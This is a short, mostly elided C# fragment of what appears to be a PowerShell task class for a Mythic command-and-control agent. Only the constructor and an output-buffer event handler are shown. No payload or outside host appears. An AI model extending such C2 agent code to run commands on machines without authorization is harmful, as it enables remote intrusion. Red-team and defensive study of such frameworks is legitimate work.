...
using ReinekeInterop.Classes.IO;
using System;
...
using ReinekeInterop.Classes.Collections;
...
namespace Tasks
{
    public class powershell : Tasking
    {
        ...
        public powershell(IAgent agent, ReinekeInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _flushMessages = () =>
            {
                string output = "";
        ...
        private void OnBufferWrite(object sender, ReinekeInterop.Classes.Events.StringDataEventArgs e)
        {
            if(e.Data != null)
            {
                try
